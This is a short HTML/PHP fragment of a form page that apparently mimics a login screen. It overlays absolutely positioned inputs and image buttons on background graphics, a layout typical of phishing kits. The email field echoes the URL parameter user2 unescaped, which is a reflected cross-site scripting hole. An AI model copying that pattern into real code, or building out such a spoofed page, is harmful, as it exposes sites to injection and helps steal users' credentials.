...
<input name="domain" value=" " readonly type="text" style="position:absolute;font-weight:bold;font-size:80%;background:none;border:none;outline:none;width:262px;left:633px;top:226px;z-index:10">
<input name="email" value="<?=$_GET[user2]?>" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:633px;top:269px;z-index:2">
...
<div id="formimage1" style="position:absolute; left:628px; top:400px; z-index:6"><input type="image" name="formimage1" width="114" height="31" src="images/btns.png"></div>
<div id="formimage1" style="position:absolute; left:628px; top:380px; z-index:6"><input type="image" name="formimage1" width="344" height="19" src="images/w4.png"></div>
